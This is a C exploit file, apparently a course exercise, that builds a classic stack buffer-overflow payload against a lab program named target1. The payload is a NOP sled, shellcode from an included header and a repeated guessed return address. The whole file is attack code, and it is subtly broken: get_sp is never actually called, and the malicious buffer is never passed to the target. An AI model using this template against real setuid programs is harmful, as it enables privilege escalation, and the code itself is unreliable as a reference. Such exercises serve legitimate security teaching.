// (c) 2015 Tony Liu and Reid Pryzant
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"

#define DEFAULT_BUFFER_SIZE 228
#define NOP                 0x90
#define TGT_ADDRESS         0xBFFFF710
#define OFFSET              0xD8 // stack pointer - address of var buf in bar

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

//constructs the malicious buffer
char *make_buffer() {
  char *buff, *tmp;
  long *addr_ptr;
  int i;
  long addr = get_sp - OFFSET; //don't know where it is yet 

  buff = (char *)malloc(DEFAULT_BUFFER_SIZE);
  addr_ptr = (long *)buff;

  //addresses are 4 bytes (32 bits)
  for(i = 0; i<DEFAULT_BUFFER_SIZE/4; i++) {
    addr_ptr[i] = addr;
  }
  
  for(i = 0; i<DEFAULT_BUFFER_SIZE/2; i++) {
    buff[i] = NOP;
  }
  //for enough room for shellcode
  tmp = buff + (DEFAULT_BUFFER_SIZE/2) - strlen(shellcode) - 1;
  
  for(i = 0; i < strlen(shellcode); i++) {
    *(tmp++) = shellcode[i];
  }
  *tmp = '\0';

  return buff;
}

int main(int argc, char *argv[])
{
  char *args[3];
  char *env[1];
  char *target = (argc == 2) ? argv[1] : "/usr/local/bin/target1";

  args[0] = target; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(target, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
